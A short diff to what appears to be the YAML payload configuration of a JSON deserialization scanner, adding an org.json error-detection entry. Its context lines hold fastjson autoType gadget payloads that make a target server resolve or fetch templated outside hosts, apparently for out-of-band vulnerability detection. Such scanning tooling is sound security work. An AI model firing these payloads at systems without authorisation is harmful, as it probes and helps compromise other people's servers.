@@ -164,3 +164,7 @@ application:
         - "{\"a\": {\"@type\": \"java.lang.AutoCloseable\",\"@type\": \"com.alibaba.fastjson.JSONReader\",\"reader\": {\"@type\": \"jdk.nashorn.api.scripting.URLReader\",\"url\": \"http://68_.%s\"}}}"
       desDetect80:
         - "[{\"@type\":\"java.lang.Exception\",\"@type\":\"com.alibaba.fastjson.JSONException\",\"x\":{\"@type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"80_.%s\"}}},{\"@type\":\"java.lang.Exception\",\"@type\":\"com.alibaba.fastjson.JSONException\",\"message\":{\"@type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"83_.%s\"}}}]"
+  orgjson:
+    payloads:
+      errDetect:
+        - "{a:'\r'}"
